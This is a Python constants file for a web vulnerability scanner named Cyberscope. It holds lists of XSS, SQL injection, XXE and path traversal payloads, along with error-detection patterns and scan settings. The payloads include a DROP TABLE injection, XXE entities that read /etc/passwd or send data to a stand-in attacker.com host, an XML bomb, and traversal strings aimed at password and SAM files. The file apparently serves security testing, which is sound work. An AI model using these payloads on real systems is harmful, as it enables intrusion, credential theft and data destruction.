"""
Constants and payload definitions for Cyberscope.

Contains vulnerability payloads, error patterns, and security indicators.
"""

from typing import List, Dict

# ============================================================================
# XSS (Cross-Site Scripting) PAYLOADS
# ============================================================================

XSS_PAYLOADS: List[str] = [
    # Basic script injection
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "<script>console.log('XSS')</script>",
    
    # Event handler variants
    "<img src=x onerror=\"alert('XSS')\">",
    "<img src=x onerror='alert(1)'>",
    "<svg onload=\"alert('XSS')\">",
    "<body onload=\"alert('XSS')\">",
    "<input onfocus=\"alert('XSS')\" autofocus>",
    
    # DOM-based variants
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    
    # Protocol handlers
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<form action=\"javascript:alert('XSS')\">",
    
    # Data attributes
    "<div data-value=\"\"><script>alert('XSS')</script>",
    
    # Style/CSS injection
    "<style>@import 'javascript:alert(\"XSS\")';</style>",
    "<div style=\"background:url('javascript:alert(1)')\">",
    
    # HTML5 variants
    "<video src=x onerror=\"alert('XSS')\">",
    "<audio src=x onerror=\"alert('XSS')\">",
    
    # Character encoding bypasses
    "<img src=x &#111;nerror=\"alert('XSS')\">",
    "<img src=x &#x6f;nerror=\"alert('XSS')\">",
    
    # Additional variants
    "<marquee onstart=\"alert('XSS')\">",
    "<details open ontoggle=\"alert('XSS')\">",
]

# ============================================================================
# SQL INJECTION PAYLOADS
# ============================================================================

SQLI_PAYLOADS: List[str] = [
    # Boolean-based blind SQLi
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    
    # Time-based blind SQLi
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    
    # Union-based SQLi
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    
    # Error-based SQLi
    "' AND extractvalue(0x0a,concat(0x3a,version()))--",
    "' AND updatexml(0x0a,concat(0x3a,(select version())),0x0a)--",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; SELECT * FROM users--",
    
    # Alternative quote styles
    "\" OR \"1\"=\"1",
    "` OR `1`=`1",
]

# ============================================================================
# CSRF DETECTION PATTERNS
# ============================================================================

CSRF_INDICATORS: Dict[str, List[str]] = {
    "missing_tokens": [
        "csrf_token",
        "csrftoken",
        "_token",
        "__RequestVerificationToken",
        "authenticity_token",
        "token",
    ],
    "dangerous_methods": ["GET", "HEAD"],
    "unsafe_headers": [
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Type: multipart/form-data",
        "Content-Type: text/plain",
    ]
}

# ============================================================================
# SECURITY HEADERS
# ============================================================================

SECURE_HEADERS: Dict[str, str] = {
    "Content-Security-Policy": "Should define CSP policy",
    "X-Frame-Options": "Should be DENY or SAMEORIGIN",
    "X-Content-Type-Options": "Should be nosniff",
    "Strict-Transport-Security": "Should enforce HSTS",
    "X-XSS-Protection": "Should be enabled",
    "Referrer-Policy": "Should be defined",
    "Permissions-Policy": "Should be configured",
}

# ============================================================================
# SQL ERROR PATTERNS
# ============================================================================

SQL_ERROR_PATTERNS: List[str] = [
    # MySQL
    "SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "MySQL Error",
    "sql_error",
    
    # PostgreSQL
    "PostgreSQL",
    "psycopg2",
    "PGError",
    
    # MSSQL
    "Unclosed quotation mark",
    "Microsoft OLE DB",
    "OleDbException",
    "ODBC error",
    
    # Oracle
    "ORA-",
    "Oracle error",
    
    # SQLite
    "SQLite",
    "database is locked",
    
    # Generic
    "SQL command not properly ended",
    "statement cannot be prepared",
    "syntax error",
    "Parse error",
    "invalid column",
    "Table or column not found",
]

# ============================================================================
# HTTP RESPONSE CODES
# ============================================================================

HTTP_STATUS_CODES: Dict[int, str] = {
    200: "OK",
    201: "Created",
    204: "No Content",
    301: "Moved Permanently",
    302: "Found",
    304: "Not Modified",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    500: "Internal Server Error",
    502: "Bad Gateway",
    503: "Service Unavailable",
}

# ============================================================================
# VULNERABILITY SEVERITY LEVELS
# ============================================================================

SEVERITY_LEVELS: List[str] = [
    "critical",
    "high",
    "medium",
    "low",
    "info"
]

SEVERITY_SCORES: Dict[str, float] = {
    "critical": 9.0,
    "high": 7.0,
    "medium": 5.0,
    "low": 3.0,
    "info": 1.0,
}

# ============================================================================
# COMMON ENDPOINTS TO TEST
# ============================================================================

COMMON_ENDPOINTS: List[str] = [
    "/search",
    "/q",
    "/query",
    "/s",
    "/find",
    "/filter",
    "/page",
    "/id",
    "/user",
    "/product",
    "/article",
    "/post",
    "/comment",
    "/search.php",
    "/api/search",
]

# ============================================================================
# REQUEST CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

COMMON_HEADERS: Dict[str, str] = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive",
}

# ============================================================================
# XML EXTERNAL ENTITY (XXE) INJECTION PAYLOADS
# ============================================================================

XXE_PAYLOADS: List[str] = [
    # Basic XXE - file read attempts
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    
    # PHP filter wrapper (for reading PHP source)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><foo>&xxe;</foo>',
    
    # Blind XXE - out-of-band data exfiltration
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=">]><foo>&xxe;</foo>',
    
    # DTD external subset
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    
    # Billion laughs attack (XML bomb)
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    
    # Parameter entity XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><foo/>'
]

XXE_ERROR_PATTERNS: List[str] = [
    # Unix/Linux file contents
    r"root:.*:0:0:",  # /etc/passwd
    r"daemon:.*:1:1:",
    
    # Windows file contents
    r"\[mail\]",  # win.ini
    r"\[isoem\]",
    r"drivers\=",
    
    # XXE error indicators
    r"DOCTYPE",
    r"ENTITY",
    r"XML",
    r"xml declaration",
    r"parse error",
    r"XML_ERROR",
    
    # Common XXE indicators
    r"java\.io\.FileNotFoundException",
    r"No such file",
    r"Permission denied",
    r"fatal error",
]

# ============================================================================
# PATH TRAVERSAL PAYLOADS
# ============================================================================

PATH_TRAVERSAL_PAYLOADS: List[str] = [
    # Unix/Linux payloads
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    
    # Windows payloads
    "..\\windows\\win.ini",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    
    # URL encoded variants
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",  # Double encoded
    "..%5c..%5cwindows%5cwin.ini",  # Windows encoded
    
    # Alternate separators
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "..%252e%252fetc%252fpasswd",
    
    # Null byte injection (older systems)
    "../etc/passwd%00",
    "../etc/passwd%00.txt",
    
    # Case variation (bypass)
    "../ETC/PASSWD",
    "..\\Windows\\win.ini",
    
    # Mixed case and encoding
    "..\\..\\Windows\\System32\\config\\sam",
    "..\\..\\..\\boot.ini",
]

PATH_TRAVERSAL_PATTERNS: List[str] = [
    # Unix/Linux file contents
    r"root:.*:0:0:",  # /etc/passwd
    r"daemon:.*:1:1:",
    r"bin:.*:2:2:",
    
    # Windows file contents
    r"\[mail\]",  # win.ini
    r"\[isoem\]",
    r"drivers\=",
    r"shell\=",
    r"C:\=",
    
    # Error indicators
    r"permission denied",
    r"No such file",
    r"Access denied",
]

# ============================================================================
# RESPONSE ANALYSIS PATTERNS
# ============================================================================

RESPONSE_PATTERNS: Dict[str, List[str]] = {
    "xss_patterns": [
        "<script>alert",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
    ],
    "sqli_patterns": SQL_ERROR_PATTERNS,
    "xxe_patterns": XXE_ERROR_PATTERNS,
    "path_traversal": PATH_TRAVERSAL_PATTERNS,
}

# ============================================================================
# SCAN CONFIGURATION DEFAULTS
# ============================================================================

DEFAULT_TIMEOUT: int = 10
DEFAULT_THREADS: int = 5
DEFAULT_RETRIES: int = 3
DEFAULT_DELAY: float = 0.5  # Delay between requests in seconds

# ============================================================================
# OUTPUT FORMATS
# ============================================================================

OUTPUT_FORMATS: List[str] = [
    "json",
    "csv",
    "html",
    "console"
]

# ============================================================================
# COMMON FORMS
# ============================================================================

FORM_INPUT_TYPES: List[str] = [
    "text",
    "search",
    "url",
    "email",
    "password",
    "number",
    "file",
    "hidden",
]
